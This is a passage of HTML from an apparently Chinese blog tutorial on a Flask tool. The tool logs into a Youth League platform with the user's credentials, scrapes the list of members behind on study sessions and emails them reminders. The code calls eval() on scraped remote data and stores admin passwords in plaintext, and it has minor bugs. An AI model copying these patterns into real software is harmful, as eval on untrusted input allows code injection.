punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 年级</span>\n    major <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>Column<span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>String<span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 专业</span>\n    count <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>Column<span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>Boolean<span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 最新一期青年大学习是否有做</span>\n    history_count <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>Column<span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>Integer<span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 本季青年大学习做了多少次</span>\n    role_id <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>Column<span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>Integer<span class=\"token punctuation\">,</span> db<span class=\"token punctuation\">.</span>ForeignKey<span class=\"token punctuation\">(</span><span class=\"token string\">\'roles.id\'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 管理身份</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__repr__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token triple-quoted-string string\">\"\"\"%s\"\"\"</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>email\n\n\n<span class=\"token comment\"># 身份模型</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Role</span><span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>Model<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    __tablename__ <span class=\"token operator\">=</span> <span class=\"token string\">\'roles\'</span>\n    <span class=\"token builtin\">id</span> <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>Column<span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>Integer<span class=\"token punctuation\">,</span> primary_key<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span>\n    name <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>Column<span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>String<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> unique<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span> \n     <span class=\"token comment\"># 1、管理员， 2、团支书， 3、普通团员</span>\n    users <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>relationship<span class=\"token punctuation\">(</span><span class=\"token string\">\'User\'</span><span class=\"token punctuation\">,</span> backref<span class=\"token operator\">=</span><span class=\"token string\">\'role\'</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__repr__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token triple-quoted-string string\">\"\"\"\n            &lt;roles(id:%d,name:%s)\n        \"\"\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token comment\"># 青年大学习模型</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">TeenStudy</span><span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>Model<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    __tablename__ <span class=\"token operator\">=</span> <span class=\"token string\">\'teenstudy\'</span>\n    <span class=\"token builtin\">id</span> <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>Column<span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>Integer<span class=\"token punctuation\">,</span> primary_key<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span>\n    study_id <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>Column<span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>String<span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 第几期，爬下日期</span>\n    study_title <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>Column<span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>String<span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 这一期的名字</span>\n    add_time <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>Column<span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>DateTime<span class=\"token punctuation\">,</span> index<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span>datetime<span class=\"token punctuation\">.</span>datetime<span class=\"token punctuation\">.</span>now<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__repr__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token triple-quoted-string string\">\"\"\"&lt;teenstudy(id:%d,study_id:%s,study_title:%s,\n        add_time:%s)&gt;\"\"\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>study_id<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>study_title<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>add_time<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">admin</span><span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>Model<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>      <span class=\"token comment\"># 管理员</span>\n    __tablenaem__ <span class=\"token operator\">=</span> <span class=\"token string\">\'admin\'</span>\n    <span class=\"token builtin\">id</span> <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>Column<span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>Integer<span class=\"token punctuation\">,</span> primary_key<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span>\n    name <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>Column<span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>String<span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    password <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>Column<span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>String<span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    add_time <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>Column<span class=\"token punctuation\">(</span>db<span class=\"token punctuation\">.</span>DateTime<span class=\"token punctuation\">,</span> index<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span>datetime<span class=\"token punctuation\">.</span>datetime<span class=\"token punctuation\">.</span>now<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__repr__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token triple-quoted-string string\">\"\"\"&lt;teenstudy(id:%d,name:%s,password:%s,\n            add_time:%s)&gt;\"\"\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>add_time<span class=\"token punctuation\">)</span>\n\n\n</code></pre> \n <h4><a id=\"223__126\"></a>2.2.3 路由部分</h4> \n <p>首先是登陆，后台将模拟浏览器登陆到智慧团建，然后就获取到cookie，拿这个cookie去将requests请求到所对应的没做的名单。</p> \n <pre><code class=\"prism language-python\">\n@app<span class=\"token punctuation\">.</span>route<span class=\"token punctuation\">(</span><span class=\"token string\">\'/login\'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\'GET\'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\'POST\'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    username <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>form<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">)</span>\n    password <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>form<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"password\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># print(username, password)</span>\n    cookie <span class=\"token operator\">=</span> GetCookie<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> cookie <span class=\"token operator\">==</span> <span class=\"token string\">\"500\"</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            <span class=\"token string\">\"code\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"500\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"msg\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"发生了点错误,请稍后重试\"</span>\n        <span class=\"token punctuation\">}</span>\n    headers <span class=\"token operator\">=</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token string\">\'Host\'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\'m.fjcyl.com\'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\'Referer\'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\'http://m.fjcyl.com/logout\'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\'User-Agent\'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\'Mozilla/5.0 (iPad; CPU OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) \'</span>\n                      <span class=\"token string\">\'Mobile/15E148 MicroMessenger/7.0.12(0x17000c33) NetType/WIFI Language/zh_CN\'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\'Cookie\'</span><span class=\"token punctuation\">:</span> cookie\n    <span class=\"token punctuation\">}</span>\n    GetSchoolInfo<span class=\"token punctuation\">(</span>headers<span class=\"token punctuation\">)</span>\n    cate<span class=\"token punctuation\">,</span> infoDetail<span class=\"token punctuation\">,</span> reg <span class=\"token operator\">=</span> GetStuInfo<span class=\"token punctuation\">(</span>headers<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> cate <span class=\"token operator\">==</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 普通团员</span>\n        <span class=\"token keyword\">if</span> reg <span class=\"token operator\">==</span> <span class=\"token number\">10001</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n                <span class=\"token string\">\"code\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">200</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"msg\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 普通团员</span>\n                <span class=\"token string\">\"info\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">10001</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"infoDetail\"</span><span class=\"token punctuation\">:</span> infoDetail<span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">elif</span> reg <span class=\"token operator\">==</span> <span class=\"token number\">10002</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n                <span class=\"token string\">\"code\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">200</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"msg\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 普通团员</span>\n                <span class=\"token string\">\"info\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">10002</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">elif</span> cate <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 团支书</span>\n        DidNumListT <span class=\"token operator\">=</span> Parma<span class=\"token punctuation\">(</span>headers<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\"># print(\"DidNumListT\")</span>\n        <span class=\"token comment\"># print(DidNumListT)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>DidNumListT<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n                <span class=\"token string\">\"code\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">200</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">if</span> reg <span class=\"token operator\">==</span> <span class=\"token number\">10001</span><span class=\"token punctuation\">:</span>\n            result <span class=\"token operator\">=</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n                <span class=\"token string\">\"code\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"200\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"info\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">10001</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 还没在数据库中存在</span>\n                <span class=\"token string\">\"msg\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 团支书</span>\n                <span class=\"token string\">\"data\"</span><span class=\"token punctuation\">:</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>DidNumListT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"infoDetail\"</span><span class=\"token punctuation\">:</span> infoDetail<span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">return</span> result\n        <span class=\"token keyword\">elif</span> reg <span class=\"token operator\">==</span> <span class=\"token number\">10002</span><span class=\"token punctuation\">:</span>\n            result <span class=\"token operator\">=</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n                <span class=\"token string\">\"code\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"200\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"msg\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 团支书</span>\n                <span class=\"token string\">\"info\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">10002</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 在数据库中不存在</span>\n                <span class=\"token string\">\"data\"</span><span class=\"token punctuation\">:</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>DidNumListT<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">return</span> result\n\n</code></pre> \n <p>找到名单之后去查询数据库，在数据库中拿到没做名单的邮箱。</p> \n <pre><code class=\"prism language-python\">@app<span class=\"token punctuation\">.</span>route<span class=\"token punctuation\">(</span><span class=\"token string\">\'/init_email\'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\'GET\'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\'POST\'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">init_email</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    QQEmail <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>form<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"QQEmail\"</span><span class=\"token punctuation\">)</span>\n    UserName <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>form<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"UserName\"</span><span class=\"token punctuation\">)</span>\n    acctId <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>form<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"acctId\"</span><span class=\"token punctuation\">)</span>\n    colName <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>form<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"colName\"</span><span class=\"token punctuation\">)</span>\n    grade <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>form<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"grade\"</span><span class=\"token punctuation\">)</span>\n    major <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>form<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"major\"</span><span class=\"token punctuation\">)</span>\n    positionName <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>form<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"positionName\"</span><span class=\"token punctuation\">)</span>\n    schoolName <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>form<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"schoolName\"</span><span class=\"token punctuation\">)</span>\n    count <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">(</span>func<span class=\"token punctuation\">.</span>count<span class=\"token punctuation\">(</span>User<span class=\"token punctuation\">.</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">filter</span><span class=\"token punctuation\">(</span>User<span class=\"token punctuation\">.</span>school <span class=\"token operator\">==</span> schoolName<span class=\"token punctuation\">,</span> User<span class=\"token punctuation\">.</span>college <span class=\"token operator\">==</span> colName<span class=\"token punctuation\">,</span>\n                                                         User<span class=\"token punctuation\">.</span>major <span class=\"token operator\">==</span> major<span class=\"token punctuation\">,</span> User<span class=\"token punctuation\">.</span>account <span class=\"token operator\">==</span> acctId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>scalar<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> count <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        user <span class=\"token operator\">=</span> User<span class=\"token punctuation\">(</span>account<span class=\"token operator\">=</span>acctId<span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span>UserName<span class=\"token punctuation\">,</span> school<span class=\"token operator\">=</span>schoolName<span class=\"token punctuation\">,</span> college<span class=\"token operator\">=</span>colName<span class=\"token punctuation\">,</span>\n                    grade<span class=\"token operator\">=</span>grade<span class=\"token punctuation\">,</span> major<span class=\"token operator\">=</span>major<span class=\"token punctuation\">,</span> origirtion<span class=\"token operator\">=</span>positionName<span class=\"token punctuation\">,</span> email<span class=\"token operator\">=</span>QQEmail<span class=\"token punctuation\">)</span>\n        db<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">)</span>\n        db<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">.</span>commit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            <span class=\"token string\">\"msg\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">200</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"data\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"success\"</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">elif</span> count <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            <span class=\"token string\">\"msg\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">200</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"data\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">10001</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 已经存在了</span>\n        <span class=\"token punctuation\">}</span>\n</code></pre> \n <p>然后就发送邮件，发送成功后，给前端返回一个成功。</p> \n <pre><code class=\"prism language-python\">\n@app<span class=\"token punctuation\">.</span>route<span class=\"token punctuation\">(</span><span class=\"token string\">\'/sendMail\'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\'GET\'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\'POST\'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">sendMail</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># print(\"DidDoneLists\")</span>\n    DidDoneLists <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>form<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"EmailList\"</span><span class=\"token punctuation\">)</span>\n    DidDoneList <span class=\"token operator\">=</span> DidDoneLists<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\",\"</span><span class=\"token punctuation\">)</span>\n    Email <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    count <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n    <span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> DidDoneList<span class=\"token punctuation\">:</span>\n        count <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n        <span class=\"token keyword\">if</span> count <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span>\n            Email<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span>\n            count <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>Email<span class=\"token punctuation\">)</span>\n    msg <span class=\"token operator\">=</span> MIMEText<span class=\"token punctuation\">(</span><span class=\"token string\">\'青年大学习！不用回复！赶紧做！！\'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 构造邮件，内容为青年大学习</span>\n    msg<span class=\"token punctuation\">[</span><span class=\"token string\">\"Subject\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"青年大学习！！又是你！！！\"</span>   <span class=\"token comment\"># 设置邮件主题</span>\n    msg<span class=\"token punctuation\">[</span><span class=\"token string\">\"From\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\'辛苦勤劳艰苦奋斗的团支书\'</span>        <span class=\"token comment\"># 寄件者</span>\n    msg<span class=\"token punctuation\">[</span><span class=\"token string\">\"To\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\'未做人员\'</span>  <span class=\"token comment\"># 收件者</span>\n    from_addr <span class=\"token operator\">=</span> <span class=\"token string\">\'\'</span>\n    password <span class=\"token operator\">=</span> <span class=\"token string\">\'\'</span>\n    smtp_server <span class=\"token operator\">=</span> <span class=\"token string\">\'smtp.qq.com\'</span>             <span class=\"token comment\"># smtp服务器地址</span>\n    to_addr <span class=\"token operator\">=</span> Email  <span class=\"token comment\"># 收件人地址</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        <span class=\"token comment\"># smtp协议的默认端口是25，QQ邮箱smtp服务器端口是465,第一个参数是smtp服务器地址，第二个参数是端口，第三个参数是超时设置,这里必须使用ssl证书，要不链接不上服务器</span>\n        server <span class=\"token operator\">=</span> smtplib<span class=\"token punctuation\">.</span>SMTP_SSL<span class=\"token punctuation\">(</span>smtp_server<span class=\"token punctuation\">,</span> <span class=\"token number\">465</span><span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n        server<span class=\"token punctuation\">.</span>login<span class=\"token punctuation\">(</span>from_addr<span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 登录邮箱</span>\n        <span class=\"token comment\"># 发送邮件，第一个参数是发送方地址，第二个参数是接收方列表，列表中可以有多个接收方地址，表示发送给多个邮箱，msg.as_string()将MIMEText对象转化成文本</span>\n        server<span class=\"token punctuation\">.</span>sendmail<span class=\"token punctuation\">(</span>from_addr<span class=\"token punctuation\">,</span> to_addr<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>as_string<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        server<span class=\"token punctuation\">.</span>quit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        logging<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"EMAIL SUCCESS\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token string\">\"code\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"200\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"info\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"success\"</span><span class=\"token punctuation\">}</span>\n        <span class=\"token comment\"># print(\'success\')</span>\n    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> e <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n            <span class=\"token comment\"># Send_Boss()</span>\n            logging<span class=\"token punctuation\">.</span>error<span class=\"token punctuation\">(</span><span class=\"token string\">\"EMAIL FAIL\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token string\">\"code\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"200\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"info\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"success\"</span><span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\'Faild:%s\'</span> <span class=\"token operator\">%</span> e<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token string\">\"code\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"500\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"info\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"fail\"</span><span class=\"token punctuation\">}</span>\n\n</code></pre> \n <h4><a id=\"222__265\"></a>2.2.2 数据交换部分</h4> \n <p>由于使用的是前后端分离，所以要用json格式传送数据，然而json格式是要双引号进行传送的，而python是默认单引号的，所以要把python的单引号变双引号！！我是用正则来进行匹配替换的。</p> \n <pre><code class=\"prism language-python\">    strinfo <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\'\"</span><span class=\"token punctuation\">)</span>\n    Num_Email <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>DidDoneNumList_Json<span class=\"token punctuation\">)</span>\n    Num_Email_Json <span class=\"token operator\">=</span> strinfo<span class=\"token punctuation\">.</span>sub<span class=\"token punctuation\">(</span><span class=\"token string\">\'\"\'</span><span class=\"token 